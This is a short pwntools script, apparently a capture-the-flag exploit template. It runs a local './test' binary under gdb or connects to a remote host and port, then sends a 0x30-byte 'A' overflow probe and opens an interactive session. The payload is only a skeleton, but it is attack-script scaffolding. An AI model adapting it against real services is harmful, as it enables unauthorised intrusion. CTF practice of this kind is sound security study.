from pwn import * 
from pwn import p64,u64
# # from LibcSearcher import *

debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./test")
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    r = gdb.debug("./test")
    pause()
    pass
elf = ELF('./test')
libc = ELF('./libc.so.6')
payload = b'A' * 0x30
r.sendline(payload)
r.interactive()